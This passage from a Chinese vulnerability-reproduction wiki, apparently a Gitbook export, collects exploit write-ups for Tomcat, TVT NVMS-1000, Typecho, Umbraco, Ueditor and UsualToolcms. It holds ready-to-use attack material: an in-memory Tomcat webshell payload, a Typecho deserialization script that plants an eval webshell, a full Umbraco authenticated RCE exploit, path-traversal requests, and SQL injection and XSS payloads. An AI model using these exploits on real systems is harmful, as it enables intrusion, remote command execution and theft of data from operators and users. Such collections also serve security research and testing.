javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext .addFilter(\"threedr3am\", threedr3am); filterRegistration.setInitParameter(\"encoding\", \"utf-8\"); filterRegistration.setAsyncSupported(false); filterRegistration .addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false, new String[]{\"/*\"}); //状态恢复，要不然服务不可用 if (stateField != null) { stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED); } if (standardContext != null) { //生效filter java.lang.reflect.Method filterStartMethod = org.apache.catalina.core.StandardContext.class .getMethod(\"filterStart\"); filterStartMethod.setAccessible(true); filterStartMethod.invoke(standardContext, null); //把filter插到第一位 org.apache.tomcat.util.descriptor.web.FilterMap[] filterMaps = standardContext .findFilterMaps(); for (int i = 0; i 和第一个步骤创建的TomcatEchoInject不一样，这里我们不但基础了AbstractTranslet，还实现了Filter创建一个我们自定义的内存Webshell 最后，我们也按照第一个步骤那样，创建一个ysoserial的CommonsCollections11类的拷贝，名叫CommonsCollections11ForTomcatShellInject，并把其Gadgets.createTemplatesImpl(command[0])的调用改成Gadgets.createTemplatesImpl(null, TomcatShellInject.class)，这样，我们的Webshell payload就完成了。 通过执行maven打包 mvn clean -Dmaven.test.skip=true compile assembly:assembly 然后执行生成的jar java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections11ForTomcatShellInject > ~/tmp/TomcatEchoInject.ysoserial 就生成了CommonsCollections11ForTomcatShellInject的payload了 0x03 测试 上一节中，我们生成了两个payload，接下来，我们启动一个具有commons-collections:commons-collections:3.2.1依赖的服务端，并且存在反序列化的接口。 然后我们把步骤一和步骤二生成的payload依次打过去 可以依次看到，两个步骤都返回500异常，相关信息证明已经执行反序列化成功了，接下来我们试试这个内存Webshell 完美，具体ysoserial改造后的代码，我已经上传到github，有兴趣可以看看 ianxtianxt/ysoserial 使用方法 Tomcat通杀回显-内存webshell 例： java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections11ForTomcatEchoInject > echo.payload 然后使用上述得到的恶意序列化数据echo.payload攻击一遍，然后再继续下面的操作 java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections11ForTomcatShellInject > shell.payload 使用恶意序列化数据shell.payload再攻击一遍，可以得到一个内存级的webshell，任意路径，参数threedram为命令 curl http://127.0.0.1:8080/aaa\\?threedr3am\\=ls%20/ 参考链接 https://xz.aliyun.com/t/7388\\#toc-3 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:07:37 "},"Web安全/Tomcat/通过jmx攻击Tomcat/通过jmx攻击Tomcat.html":{"url":"Web安全/Tomcat/通过jmx攻击Tomcat/通过jmx攻击Tomcat.html","title":"通过jmx攻击Tomcat","keywords":"","body":"通过jmx攻击Tomcat 一、漏洞简介 利用条件 /manager应用程序不限于本地主机 jmx可访问（没有身份验证） tomcat用户数据库可写 二、漏洞影响 三、复现过程 我们通过jconsole连接到服务器，可以执行一些特定于Tomcat的方法让我们进入。 如果UserDatabase标记为writable = true，则readonly = false： 在UserDatabase节点下，我们可以创建新用户。我们将用户名密码新建为tomcat： 确保我们也在服务器上创建了manager-gui角色，因此我们得到了完全授权： 移动到Users 树中的节点，我们可以将创建的用户与创建的角色相关联： 保存配置后： 我们可以在/manager/html端点上输入我们的凭据： 成功登陆进去！ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:07:38 "},"Web安全/Tomcat URL解析差异性导致的安全问题/URL差异性/Tomcat HttpServletRequest中几个解析URL的函数/Tomcat HttpServletRequest中几个解析URL的函数.html":{"url":"Web安全/Tomcat URL解析差异性导致的安全问题/URL差异性/Tomcat HttpServletRequest中几个解析URL的函数/Tomcat HttpServletRequest中几个解析URL的函数.html","title":"Tomcat HttpServletRequest中几个解析URL的函数","keywords":"","body":"Tomcat HttpServletRequest中几个解析URL的函数 在Servlet处理URL请求的路径时，HTTPServletRequest有如下几个常用的函数： request.getRequestURL()：返回全路径； request.getRequestURI()：返回除去Host（域名或IP）部分的路径； request.getContextPath()：返回工程名部分，如果工程映射为/，则返回为空； request.getServletPath()：返回除去Host和工程名部分的路径； request.getPathInfo()：仅返回传递到Servlet的路径，如果没有传递额外的路径信息，则此返回Null； 网上的一个小结，Servlet的匹配路径为/test%3F/*，并且Web应用是部署在/app下，此时请求的URL为http://30thh.loc:8480/app/test%3F/a%3F+b;jsessionid=s%3F+ID?p+1=c+d&p+2=e+f#a，各个函数解析如下表： 函数 URL解码 解析结构 getRequestURL() no http://30thh.loc:8480/app/test%3F/a%3F+b;jsessionid=s%3F+ID getRequestURI() no /app/test%3F/a%3F+b;jsessionid=s%3F+ID getContextPath() no /app getServletPath() yes /test? getPathInfo() yes /a?+b Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:00 "},"Web安全/Tomcat URL解析差异性导致的安全问题/URL差异性/Tomcat 特殊字符的URL解析/Tomcat 特殊字符的URL解析.html":{"url":"Web安全/Tomcat URL解析差异性导致的安全问题/URL差异性/Tomcat 特殊字符的URL解析/Tomcat 特殊字符的URL解析.html","title":"Tomcat 特殊字符的URL解析","keywords":"","body":"Tomcat 特殊字符的URL解析 新建一个Java Web项目，index.jsp如下： \"); out.println(\"getRequestURI(): \" + request.getRequestURI() + \"\"); out.println(\"getContextPath(): \" + request.getContextPath() + \"\"); out.println(\"getServletPath(): \" + request.getServletPath() + \"\"); out.println(\"getPathInfo(): \" + request.getPathInfo() + \"\"); %> 正常访问 Tomcat运行之后，正常访问http://localhost:8080/urltest/index.jsp，页面输出如下： 插入 ./ 访问 尝试插入多个./访问即http://localhost:8080/urltest/./././index.jsp，页面输出如下： 可以看到，插入多个./也能正常访问。 接着尝试这种形式http://localhost:8080/urltest/.a/.bb/.ccc/index.jsp，发现是返回404，未找到该资源访问： 插入 ../ 访问 尝试插入../访问即http://localhost:8080/urltest/../index.jsp，页面输出如下： 可以是返回的404，这是因为实际访问的是http://localhost:8080/index.jsp，这个目录文件当然不存在。 换种跨目录的形式就OK了http://localhost:8080/urltest/noexist/../index.jsp： 插入 ;/ 访问 尝试插入多个;/访问即http://localhost:8080/urltest/;/;/;/index.jsp，页面输出如下： 可以看到，插入多个;也能正常访问。 在;号后面加上字符串也是能正常访问的，如http://localhost:8080/urltest/;a/;bb/;ccc/index.jsp： 插入其他特殊字符访问 尝试插入如下这些特殊字符进行访问，页面均返回400或404，无法访问： ` ~ ! @ # $ % ^ & * ( ) - _ = + [ ] { } \\ | : ' \" ? 小结 由前面的尝试知道，Tomcat中的URL解析是支持嵌入./、../、;xx/等特殊字符的。此外，getRequestURL()和getRequestURI()这两个函数解析提取的URL内容是包含我们嵌入的特殊字符的，当使用不当时会存在安全问题如绕过认证。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:00 "},"Web安全/Tomcat URL解析差异性导致的安全问题/简介/简介.html":{"url":"Web安全/Tomcat URL解析差异性导致的安全问题/简介/简介.html","title":"简介","keywords":"","body":"简介 Tomcat是常见的Web中间件，实际上是利用NIO技术处理HTTP请求，在接收到请求时会对客户端提交的参数、URL、Header和Body数据进行解析，并生成Request对象，然后调用实际的JSP或Servlet。 当后台程序使用getRequestURI()或getRequestURL()函数来解析用户请求的URL时，若URL中包含了一些特殊符号，则可能会造成访问限制绕过的安全风险。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:14 "},"Web安全/Tomcat URL解析差异性导致的安全问题/调试分析/Tomcat URL 解析差异性攻击利用/Tomcat URL 解析差异性攻击利用.html":{"url":"Web安全/Tomcat URL解析差异性导致的安全问题/调试分析/Tomcat URL 解析差异性攻击利用/Tomcat URL 解析差异性攻击利用.html","title":"Tomcat URL 解析差异性攻击利用","keywords":"","body":"Tomcat URL 解析差异性攻击利用 看个访问限制绕过的场景。 假设Tomcat上启动的Web目录下存在一个info目录，其中有一个secret.jsp文件，其中包含敏感信息等： Secret username: mi1k7ea password: 123456 address: china phone: 13666666666 新建一个filter包，其中新建一个testFilter类，实现Filter接口类： package filter; import javax.servlet.*; import javax.servlet.http.*; import java.io.IOException; public class testFilter implements Filter { @Override public void init(FilterConfig filterConfig) throws ServletException { } @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { HttpServletRequest httpServletRequest = (HttpServletRequest)servletRequest; HttpServletResponse httpServletResponse = (HttpServletResponse)servletResponse; String url = httpServletRequest.getRequestURI(); if (url.startsWith(\"/urltest/info\")) { httpServletResponse.getWriter().write(\"No Permission.\"); return; } filterChain.doFilter(servletRequest, servletResponse); } @Override public void destroy() { } } 这个Filter作用是：只要访问/urltest/info目录下的资源，都需要进行权限判断，否则直接放行。可以看到，这里调用getRequestURI()函数来获取请求中的URL目录路径，然后调用startsWith()函数判断是否是访问的敏感目录，若是则返回无权限的响应。当然这里写得非常简单，只做演示用。 编辑web.xml，添加testFilter设置： testFilter filter.testFilter testFilter /* 运行之后，访问http://localhost:8080/urltest/info/secret.jsp，会显示无权限： 根据前面的分析构造如下几个payload都能成功绕过认证限制来访问： http://localhost:8080/urltest/./info/secret.jsp http://localhost:8080/urltest/;mi1k7ea/info/secret.jsp http://localhost:8080/urltest/mi1k7ea/../info/secret.jsp http://localhost:8080/urltest/mi1k7ea/..;/info/secret.jsp http://localhost:8080//urltest/info/secret.jsp 整个的过程大致如此，就是利用解析的差异性来绕过认证 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:10 "},"Web安全/Tomcat URL解析差异性导致的安全问题/调试分析/Tomcat对URL特殊字符的处理/Tomcat对URL特殊字符的处理.html":{"url":"Web安全/Tomcat URL解析差异性导致的安全问题/调试分析/Tomcat对URL特殊字符的处理/Tomcat对URL特殊字符的处理.html","title":"Tomcat对URL特殊字符的处理","keywords":"","body":"Tomcat对URL特殊字符的处理 这里我们先来调试分析下Tomcat是如何对请求URL中不同的特殊字符作不同的处理的。 经过调试分析，得知Tomcat是在CoyoteAdapter.service()函数上对请求URL进行解析处理的，直接在这里打上断点，此时的函数调用栈如下： service:452, CoyoteAdapter (org.apache.catalina.connector) process:1195, AbstractHttp11Processor (org.apache.coyote.http11) process:654, AbstractProtocol$AbstractConnectionHandler (org.apache.coyote) run:317, JIoEndpoint$SocketProcessor (org.apache.tomcat.util.net) runWorker:1142, ThreadPoolExecutor (java.util.concurrent) run:617, ThreadPoolExecutor$Worker (java.util.concurrent) run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads) run:745, Thread (java.lang) 在CoyoteAdapter.service()函数中，会调用postParseRequest()函数来解析URL请求内容： 跟进postParseRequest()函数中，其中先后调用parsePathParameters()和normalize()函数对请求内容进行解析处理： 这里我们先跟进parsePathParameters()函数，先是寻找URL中是否存在;号，找到的话才会进入下面的if代码逻辑： 如果找到了;号，在if代码逻辑中后面的循环体会将;xxx/中的分号与斜杠之间的字符串以及分号本身都去掉，我们访问http://localhost:8080/urltest/;mi1k7ea/index.jsp再试下，就可以进入该代码逻辑调试看到（代码中ASCII码59是;，47是/）： 由此可知，parsePathParameters()函数是对;xxx/这种形式进行处理的。 接着，跟进normalize()函数，该函数是对经过parsePathParameters()函数处理过后的请求URL进行标准化处理。 先看到这段代码，ASCII码92表示\\，当匹配到时将其替换为ASCII码为47的/；当匹配到ASCII码0即空字符时，直接返回false无法成功解析： 往下是这段循环，判断是否有连续的/，存在的话则循环删除掉多余的/： 接着往下看，这段循环就是对./和../这些特殊字符进行处理，如果这两个字符串都找不到则直接返回true： 这里尝试下添加/./访问的处理，看到找到之后是直接将其去掉然后继续放行： 这里尝试下添加/../访问的处理，看到找到后是会进行往前目录层级的回溯处理再拼接到上面某一层目录形成新的URL： 由此可知，normalize()函数对经过经过parsePathParameters()函数过滤过;xxx/的URL请求内容进标准化处理，具体为将连续的多个/给删除掉只保留一个、将/./删除掉、将/../进行跨目录拼接处理，最后返回处理后的URL路径。 结论 Tomcat对/;xxx/以及/./的处理是包容的、对/../会进行跨目录拼接处理。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:11 "},"Web安全/TVT数码科技-NVMS-1000/TVT数码科技 NVMS-1000 路径遍历漏洞/TVT数码科技 NVMS-1000 路径遍历漏洞.html":{"url":"Web安全/TVT数码科技-NVMS-1000/TVT数码科技 NVMS-1000 路径遍历漏洞/TVT数码科技 NVMS-1000 路径遍历漏洞.html","title":"TVT数码科技 NVMS-1000 路径遍历漏洞","keywords":"","body":"TVT数码科技 NVMS-1000 路径遍历漏洞 漏洞描述 TVT数码科技 TVT NVMS-1000是中国TVT数码科技公司的一套网络监控视频管理系统。 TVT数码科技 TVT NVMS-1000中存在路径遍历漏洞。远程攻击者可通过发送包含/../的特制URL请求利用该漏洞查看系统上的任意文件。 漏洞影响 TVT NVMS-1000 FOFA app=\"TVT-NVMS-1000\" 漏洞复现 登录页面如下 发送请求包读取文件 GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1 Host: Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:14 "},"Web安全/Typecho/Typecho 1.1 反序列化漏洞导致前台getshell/Typecho 1.1 反序列化漏洞导致前台getshell.html":{"url":"Web安全/Typecho/Typecho 1.1 反序列化漏洞导致前台getshell/Typecho 1.1 反序列化漏洞导致前台getshell.html","title":"Typecho 1.1 反序列化漏洞导致前台getshell","keywords":"","body":"Typecho 1.1 反序列化漏洞导致前台getshell 一、漏洞简介 二、漏洞影响 Typecho 1.1 三、复现过程 漏洞分析 复现环境：PHP5.6+Apache+Windows Typecho_Cookie::get目的是获取Cookie，可从Cookie或POST中获取 要执行到此处需要经过前面的各种判断条件： $_GET['finish'] 不为空 $_SERVER['HTTP_REFERER'] 不为空 //判断是否已经安装 if (!isset($_GET['finish']) && file_exists(__TYPECHO_ROOT_DIR__ . '/config.inc.php') && empty($_SESSION['typecho'])) { exit; } // 挡掉可能的跨站请求 if (!empty($_GET) || !empty($_POST)) { if (empty($_SERVER['HTTP_REFERER'])) { exit; } } 接下来需要寻找利用链，常见魔法方法： __construct()//创建对象时触发 __destruct() //对象被销毁时触发 __call() //在对象上下文中调用不可访问的方法时触发 __callStatic() //在静态上下文中调用不可访问的方法时触发 __get() //用于从不可访问的属性读取数据 __set() //用于将数据写入不可访问的属性 __isset() //在不可访问的属性上调用isset()或empty()触发 __unset() //在不可访问的属性上使用unset()时触发 __invoke() //当脚本尝试将对象调用为函数时触发 __wakeup() //使用unserialize时触发 __sleep() //使用serialize时触发 __toString()//类当String用 误以为是通过__desctruct()和__wakeup()触发，没想到起始是利用__toString()，接着通过__get()触发。 回到install.php中看232行中$config['adapter']作为了Typecho_Db()参数，只要控制$config['adapter']的值为某一个类的对象就可以触发__toString()，那么$config的值应为一个数组。 接下来寻找__toString()方法，在var/Typecho/Feed.php中找到 $item可控，如果$item['author']为某个不存在screenName属性的类对象时，自动触发__get()方法var/Typecho/Request.php，如下图，显然可控吧~ 漏洞复现 根据漏洞分析写出poc _params = array(\"screenName\"=>\"id\"); $this->_filter = array(\"system\"); } } class Typecho_Feed{ private $_items = array(); private $_type; public function __construct(){ $this->_items = array( array( \"author\"=>new Typecho_Request(), \"link\"=>\"link\", \"title\"=>\"title\", \"date\"=>\"date\", \"category\"=>array(new Typecho_Request()),#注意点 ) ); $this->_type = \"RSS 2.0\"; } } $a = array(\"adapter\"=>new Typecho_Feed()); #echo serialize(($a)).\"\\n\"; echo base64_encode(serialize(($a))).\"\\n\"; 关于poc中注意点说明： 在漏洞分析时并没有涉及该行相关数据，在没有这一行数据时： 程序继续进入到Db.php的构造方法中，并在下图汇总抛出异常 如果是命令是写入文件，则不会影响结果，但如果需要显示命令结果，则无法实现，因而考虑在抛出异常之前结束运行程序运行 最终结果 Python脚本，仅用作学习目的 import sys import requests class Typecho_install_getshell_Test: def __init__(self,url): self.url = url def run(self): headers = { \"User-Agent\":\"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\", \"Cookie\":\"__typecho_config=YToxOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6NTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NjU6ImZpbGVfcHV0X2NvbnRlbnRzKCdzaGVsbC5waHAnLCc8P3BocCBAZXZhbCgkX1BPU1RbXCdwYXNzXCddKTs/PicpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX1zOjQ6ImxpbmsiO3M6NDoibGluayI7czo1OiJ0aXRsZSI7czo1OiJ0aXRsZSI7czo0OiJkYXRlIjtzOjQ6ImRhdGUiO3M6ODoiY2F0ZWdvcnkiO2E6MTp7aTowO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NjU6ImZpbGVfcHV0X2NvbnRlbnRzKCdzaGVsbC5waHAnLCc8P3BocCBAZXZhbCgkX1BPU1RbXCdwYXNzXCddKTs/PicpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19fX1zOjE5OiIAVHlwZWNob19GZWVkAF90eXBlIjtzOjc6IlJTUyAyLjAiO319;XDEBUG_SESSION=15908\", \"Referer\":self.url, } vulnpath = self.url + \"/install.php?finish=1\" try: requests.get(vulnpath,headers=headers,timeout=10) shellpath = self.url + \"shell.php\" data = { \"pass\":\"phpinfo();\", } re = requests.post(shellpath,headers=headers,data=data,timeout=10) re.encoding = re.apparent_encoding if \"Configure Command \" in re.text: print(\"[+]Typecho反序列化漏洞存在! \\nPayload: \"+ shellpath + \"\\tPassWord: pass\") else: print(\"[-]Typecho漏洞可能不存在!\") except: print(\"[-]Something wrong!\") if __name__ == \"__main__\": Vuln = Typecho_install_getshell_Test(sys.argv[1]) Vuln.run() 参考链接 http://pines404.online/2020/01/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:16 "},"Web安全/Typesetter CMS/Typesetter CMS任意文件上传/Typesetter CMS任意文件上传.html":{"url":"Web安全/Typesetter CMS/Typesetter CMS任意文件上传/Typesetter CMS任意文件上传.html","title":"Typesetter CMS任意文件上传","keywords":"","body":"Typesetter CMS任意文件上传 Steps to reproduce 1- As admin go to Content menu and click on Uploaded files 2- Inside the try to upload a .php file, and 3- try to upload a .php file directly, check that it is not possible. 4- Take the same .php file and place it in a .zip and upload it. 5- Extract through functionality and open the .php file Obs: A strange behavior was that, after extracting the PHP file in functionality, it is seen as HTML. PoC ==> Executing Commands ![poc_01](resource/Typesetter%20CMS%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/media/93630451-7595a580-f9c0-11ea-9166-30d2ede2535a.gif) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:19 "},"Web安全/Ueditor/ueditor .net版本上传漏洞/ueditor .net版本上传漏洞.html":{"url":"Web安全/Ueditor/ueditor .net版本上传漏洞/ueditor .net版本上传漏洞.html","title":"ueditor .net版本上传漏洞","keywords":"","body":"ueditor .net版本上传漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 本地上传poc shell addr: 上传文件名为 1 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:20 "},"Web安全/Ueditor/ueditor ssrf/ueditor ssrf.html":{"url":"Web安全/Ueditor/ueditor ssrf/ueditor ssrf.html","title":"Ueditor Ssrf","keywords":"","body":"ueditor ssrf 一、漏洞简介 二、漏洞影响 三、复现过程 存在漏洞路径： /ueditor/jsp/getRemoteImage.jsp?upfile=http://127.0.0.1/favicon.ico?.jpg /ueditor/jsp/controller.jsp?action=catchimage&source[]=https://www.baidu.com/img/baidu_jgylogo3.gif /ueditor/php/controller.php?action=catchimage&source[]=https://www.baidu.com/img/baidu_jgylogo3.gif 存在就会抓取成功、也可以抓取外网的测 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:20 "},"Web安全/Ueditor/ueditor 允许xml上传的xss漏洞/ueditor 允许xml上传的xss漏洞.html":{"url":"Web安全/Ueditor/ueditor 允许xml上传的xss漏洞/ueditor 允许xml上传的xss漏洞.html","title":"ueditor 允许xml上传的xss漏洞","keywords":"","body":"ueditor 允许xml上传的xss漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:21 "},"Web安全/Ueditor/百度ueditor编辑器 xss漏洞/百度ueditor编辑器 xss漏洞.html":{"url":"Web安全/Ueditor/百度ueditor编辑器 xss漏洞/百度ueditor编辑器 xss漏洞.html","title":"百度ueditor编辑器 xss漏洞","keywords":"","body":"百度ueditor编辑器 xss漏洞 一、漏洞简介 产品官网下载地址： https://ueditor.baidu.com/website/download.html#mini 涉及版本：php , asp, jsp, net 二、漏洞影响 三、复现过程 漏洞分析 存在漏洞的文件： /php/getContent.php /asp/getContent.asp /jsp/getContent.jsp /net/getContent.ashx /php/getContent.php 入进行了过滤，但是在14行输出时却使用了htmlspecialchars_decode，造成XSS漏洞。 /asp/getContent.asp 获取myEditor参数无过滤，直接输出。 /jsp/getContent.jsp 获取myEditor参数无过滤，直接输出。 /net/getContent.ashx 获取myEditor参数无过滤，直接输出。 漏洞复现 php版本测试，其他版本一样。 url: http://0-sec.org/php/getcontent.php payload: myEditor=alert(document.cookie) // myEditor中的’ E ’必须大写，小写无效。 由于只是个反弹XSS，单独这个漏洞影响小。若能结合使用该编辑器的网站的其他漏洞使用，则可能产生不错的效果。 四、参考链接 https://blog.csdn.net/yun2diao/article/details/91381846 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:22 "},"Web安全/Umbraco CMS/Umbraco CMS 7.12.4 后台远程命令执行漏洞/Umbraco CMS 7.12.4 后台远程命令执行漏洞.html":{"url":"Web安全/Umbraco CMS/Umbraco CMS 7.12.4 后台远程命令执行漏洞/Umbraco CMS 7.12.4 后台远程命令执行漏洞.html","title":"Umbraco CMS 7.12.4 后台远程命令执行漏洞","keywords":"","body":"Umbraco CMS 7.12.4 后台远程命令执行漏洞 一、漏洞简介 二、漏洞影响 Umbraco CMS 7.12.4 三、复现过程 Usage $ python exploit.py -h usage: exploit.py [-h] -u USER -p PASS -i URL -c CMD [-a ARGS] Umbraco authenticated RCE optional arguments: -h, --help show this help message and exit -u USER, --user USER username / email -p PASS, --password PASS password -i URL, --host URL root URL -c CMD, --command CMD command -a ARGS, --arguments ARGS arguments Examples: $ python exploit.py -u admin@example.org -p password123 -i 'http://10.0.0.1' -c ipconfig $ python exploit.py -u admin@example.org -p password123 -i 'http://10.0.0.1' -c powershell.exe -a '-NoProfile -Command ls' poc # Exploit Title: Umbraco CMS - Authenticated Remote Code Execution # Date: 2020-03-28 # Exploit Author: Alexandre ZANNI (noraj) # Based on: https://www.exploit-db.com/exploits/46153 # Vendor Homepage: http://www.umbraco.com/ # Software Link: https://our.umbraco.com/download/releases # Version: 7.12.4 # Category: Webapps # Tested on: Windows IIS # Example: python exploit.py -u admin@example.org -p password123 -i 'http://10.0.0.1' -c ipconfig import requests import re import argparse from bs4 import BeautifulSoup parser = argparse.ArgumentParser(prog='exploit.py', description='Umbraco authenticated RCE', formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=80)) parser.add_argument('-u', '--user', metavar='USER', type=str, required=True, dest='user', help='username / email') parser.add_argument('-p', '--password', metavar='PASS', type=str, required=True, dest='password', help='password') parser.add_argument('-i', '--host', metavar='URL', type=str, required=True, dest='url', help='root URL') parser.add_argument('-c', '--command', metavar='CMD', type=str, required=True, dest='command', help='command') parser.add_argument('-a', '--arguments', metavar='ARGS', type=str, required=False, dest='arguments', help='arguments', default='') args = parser.parse_args() # Payload payload = \"\"\" public string xml() { string cmd = \"%s\"; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = \"%s\"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \"\"\" % (args.arguments, args.command) login = args.user password = args.password host = args.url # Process Login url_login = host + \"/umbraco/backoffice/UmbracoApi/Authentication/PostLogin\" loginfo = { \"username\": login, \"password\": password} s = requests.session() r2 = s.post(url_login,json=loginfo) # Go to vulnerable web page url_xslt = host + \"/umbraco/developer/Xslt/xsltVisualize.aspx\" r3 = s.get(url_xslt) soup = BeautifulSoup(r3.text, 'html.parser') VIEWSTATE = soup.find(id=\"__VIEWSTATE\")['value'] VIEWSTATEGENERATOR = soup.find(id=\"__VIEWSTATEGENERATOR\")['value'] UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN'] headers = {'UMB-XSRF-TOKEN': UMBXSRFTOKEN} data = { \"__EVENTTARGET\": \"\", \"__EVENTARGUMENT\": \"\", \"__VIEWSTATE\": VIEWSTATE, \"__VIEWSTATEGENERATOR\": VIEWSTATEGENERATOR, \"ctl00$body$xsltSelection\": payload, \"ctl00$body$contentPicker$ContentIdValue\": \"\", \"ctl00$body$visualizeDo\": \"Visualize+XSLT\" } # Launch the attack r4 = s.post(url_xslt, data=data, headers=headers) # Filter output soup = BeautifulSoup(r4.text, 'html.parser') CMDOUTPUT = soup.find(id=\"result\").getText() print(CMDOUTPUT) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:24 "},"Web安全/UsualToolcms/UsualToolcms 8.0 a_bookx.php 后台注入漏洞/UsualToolcms 8.0 a_bookx.php 后台注入漏洞.html":{"url":"Web安全/UsualToolcms/UsualToolcms 8.0 a_bookx.php 后台注入漏洞/UsualToolcms 8.0 a_bookx.php 后台注入漏洞.html","title":"UsualToolcms 8.0 a_bookx.php 后台注入漏洞","keywords":"","body":"UsualToolcms 8.0 a_bookx.php 后台注入漏洞 一、漏洞简介 二、漏洞影响 UsualToolcms 8.0 三、复现过程 mysqli_query不支持堆叠，无回显初步构造payload： t=move&id[0]=1',(select 1 and sleep(10)),'2 执行的SQL语句： UPDATE `cms_book` set catid='' WHERE id in('1',(select 1 and sleep(10)),'2') 能够正确执行的SQL语句： UPDATE `cms_book` set catid='' WHERE id in(1,(select 1 and sleep(10))) 因此初步设想以失败告终，$result返回bool值，True显示咨询删除成功，false则显示咨询删除失败则可以if构造语句，语句判断语句为真则执行一条可执行的语句，假若为假执行一条报错语句即可使result为False的语句 updatexml，if条件真假与否都会报错 extractvalue，if条件真假与否都会报错 join报错:select id from mysql.user a join mysql.user b ，result返回结果均为true floor报错：SELECT COUNT(*) FROM user GROUP BY FLOOR(RAND(0)*2);同样返回结果均为true exp(): mysql>=5.5.5会报错;mysql>=5.5.53，报错不能注出数据，我这里为5.5.53，但是可以用于使语句返回结果为false POC： https://www.0-sec.org/demo/cmsadmin/a_bookx.php?t=move&id[0]=1%27)or%20if((substr((select%20user()),1,1))=%27d%27,(select%201),exp(~0));%23 参考链接 https://xz.aliyun.com/t/8100 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:25 "},"Web安全/UsualToolcms/UsualToolcms 8.0 a_modsx.php 任意文件删除/UsualToolcms 8.0 a_modsx.php 任意文件删除.html":{"url":"Web安全/UsualToolcms/UsualToolcms 8.0 a_modsx.php 任意文件删除/UsualToolcms 8.0 a_modsx.php 任意文件删除.html","title":"UsualToolcms 8.0 a_modsx.php 任意文件删除","keywords":"","body":"UsualToolcms 8.0 a_modsx.php 任意文件删除 一、漏洞简介 二、漏洞影响 UsualToolcms 8.0 三、复现过程 漏洞位置在a_modsx.php id由用户传入，且有一层过滤 过滤逻辑存在问题，str_replace只替换一次，将../替换为空格绕过： .../...// --> ../ 意味着可以实现跨目录删除指定目录 参考链接 https://xz.aliyun.com/t/8100 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:28 "},"Web安全/UsualToolcms/UsualToolcms 8.0 a_pagex.php盲注/UsualToolcms 8.0 a_pagex.php盲注.html":{"url":"Web安全/UsualToolcms/UsualToolcms 8.0 a_pagex.php盲注/UsualToolcms 8.0 a_pagex.php盲注.html","title":"UsualToolcms 8.0 a_pagex.php盲注","keywords":"","body":"UsualToolcms 8.0 a_pagex.php盲注 一、漏洞简介 二、漏洞影响 UsualToolcms 8.0 三、复现过程 poc pagename=test&istop=0&isbottom=0&title=test&webkey=test&description=test&editorValue=1'and if(ascii(substr(user(),1,1))=100,sleep(2),1)#&id=2&submit=%E7%BC%96%E8%BE%91 editorValue参数需要手动添加 